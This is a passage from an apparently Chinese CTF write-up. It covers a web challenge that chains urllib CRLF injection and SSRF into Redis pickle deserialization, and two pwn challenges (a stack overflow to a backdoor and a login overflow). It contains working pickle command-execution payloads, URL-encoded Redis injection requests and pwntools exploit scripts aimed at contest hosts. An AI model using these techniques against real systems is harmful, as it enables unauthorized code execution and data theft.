class=&#34;string&#34;&gt;&amp;#x27;/source&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;source&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看上去是一个 pickle 反序列化加上 ssrf 的洞，具体啥原理还不是很懂，先写下参考地址：漏洞是叫 CRLF 编号为 CVE 2019-9947，参考资料可以是&lt;br&gt;
&lt;a href=&#34;https://blog.csdn.net/xiru9972/article/details/128343676&#34;&gt; Python urllib CRLF 注入漏洞小结_urllib crlf 漏洞 - CSDN 博客&lt;/a&gt;&lt;br&gt;
首先是构造 key 值：&lt;br&gt;
md5(‘&lt;a href=&#34;http://1&#34;&gt;http://1&lt;/a&gt;’)=22d474190b1889d3373fa4f9334e979c&lt;br&gt;
** 用脚本构造 pickle 的反序列数据 ** :&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&amp;#x27;cos system&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;(S&amp;#x27;command here&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;tR.&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(base64.b64encode(a))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为采用的是 flask 框架，最简单获得回显的方式就是写文件到静态目录&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&amp;#x27;cos&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;system&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;(S&amp;#x27;mkdir static&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;tR.&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(base64.b64encode(a))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再将 flag 的内容重定向到 static/1.txt 中&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&amp;#x27;cos&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;system&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;(S&amp;#x27;cat /flag&amp;gt;static/1.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;tR.&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(base64.b64encode(a))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;所以，payload 依次为：&lt;br&gt;
写入 redis 内缓存，创建静态目录 static&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/?url=127.0.0.1:6379?%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydta2Rp&lt;br&gt;
ciBzdGF0aWMnCnRSLg%3d%3d%22%0d%0apaddins&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;缓存之后触发反序列化：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/?url=1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;读取 flag，并重定向到 /static/1.txt 内：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/?url=127.0.0.1:6379?%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydjYXQg&lt;br&gt;
L2ZsYWc%2bc3RhdGljLzEudHh0Jwp0Ui4%3d%22%0d%0apaddins&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;缓存之后触发反序列化：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/?url=1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;之后访问 /static/1.txt 拿到 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;#123;qtRqiLrtTp6hoN2RPMti&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;pwn-babypwn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn-babypwn&#34;&gt;#&lt;/a&gt; Pwn-babypwn&lt;/h2&gt;
&lt;p&gt;（这个题不知为啥，有种莫名奇妙的感觉，本地无论几次都不同，远程就能通）&lt;br&gt;
查看开启的保护：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@g01den-virtual-machine:/mnt/shared&lt;span class=&#34;comment&#34;&gt;# checksec pwn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/mnt/shared/pwn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64-&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX unknown - GNU_STACK missing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No &lt;span class=&#34;title function_ invoke__&#34;&gt;PIE&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;0x400000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    Executable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RWX:      Has RWX segments&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;反编译之后，找到漏洞函数 login ()：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_ invoke__&#34;&gt;login&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; v0; &lt;span class=&#34;comment&#34;&gt;// ebx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char buf[&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-50h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char s1[&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-30h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;title function_ invoke__&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Enter your username: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;title function_ invoke__&#34;&gt;read&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x40uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;title function_ invoke__&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Enter the password: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;title function_ invoke__&#34;&gt;read&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, s1, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x40uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = &lt;span class=&#34;title function_ invoke__&#34;&gt;strcmp&lt;/span&gt;(buf, &lt;span class=&#34;string&#34;&gt;&amp;quot;root&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v0 | (unsigned &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;)&lt;span class=&#34;title function_ invoke__&#34;&gt;strcmp&lt;/span&gt;(s1, &lt;span class=&#34;string&#34;&gt;&amp;quot;!@#$%^&amp;amp;*()_+&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;并且，存在后门函数 sub_401176，地址为 0x401176，所以，根据 gdb 调试，得知缓冲区加上 ebp 的大小为 120 字节，所以 exp 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io = process(&amp;quot;./pwn&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = &lt;span class=&#34;title function_ invoke__&#34;&gt;remote&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;prob07.contest.pku.edu.cn&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10007&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;backdoor = &lt;span class=&#34;number&#34;&gt;0x40117a&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;#不知道为啥，这里如果是0x401176的话，打不通&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;token = b&lt;span class=&#34;string&#34;&gt;&amp;quot;502:MEUCIQCSKqRJcp-PqKLApv7lBRVleK1e5RKveCEC5QmjJ0OONQIgRVfKZtoZoiGXf4sDyUDuFG0Uf0DLCPGdYFAkCEYMvw4=&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;sendline&lt;/span&gt;(token)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;recvuntil&lt;/span&gt;(b&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter your username: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;120&lt;/span&gt; + &lt;span class=&#34;title function_ invoke__&#34;&gt;p64&lt;/span&gt;(backdoor)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;sendline&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;recv&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;interactive&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后 flag 为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;#123;kooD1EijiemeePh8ieNei2Xol8ich5DE&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;pwn-login&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn-login&#34;&gt;#&lt;/a&gt; Pwn-Login&lt;/h2&gt;
&lt;p&gt;没有附件 nc 连上多测试几次就会知道 password 多输几个字符就会输出二进制文件&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/bb9e55ffa5a970fe87d400ae5ee87bd1.png&#34; alt=&#34;图片.png&#34;&gt; 多试试 0x28 个字符时能接收到正确的文件&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;prob04.contest.pku.edu.cn&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;10004&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;token: &amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;502:MEUCIQCSKqRJcp-PqKLApv7lBRVleK1e5RKveCEC5QmjJ0OONQIgRVfKZtoZoiGXf4sDyUDuFG0Uf0DLCPGdYFAkCEYMvw4=&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Username&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;admin\x00&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Password&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;dumped\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = io.recvall()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fp = &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;att&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;wb&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fp.write(key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;chmod 777 att&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2024/pdf/35351481/1715082297034-35f306cd-50b1-455f-b6c1-cb7cfc6fc121.pdf?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2024%2Fpdf%2F35351481%2F1715082297034-35f306cd-50b1-455f-b6c1-cb7cfc6fc121.pdf%22%2C%22name%22%3A%22att.pdf%22%2C%22size%22%3A16704%2C%22ext%22%3A%22pdf%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22uf4b5f3f2-6aee-45c5-9d6d-c90a660325f%22%2C%22taskType%22%3A%22upload%22%2C%22type%22%3A%22application%2Fpdf%22%2C%22__spacing%22%3A%22both%22%2C%22mode%22%3A%22title%22%2C%22id%22%3A%22u0556113f%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D&#34;&gt;att.pdf&lt;/a&gt;(zip)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span 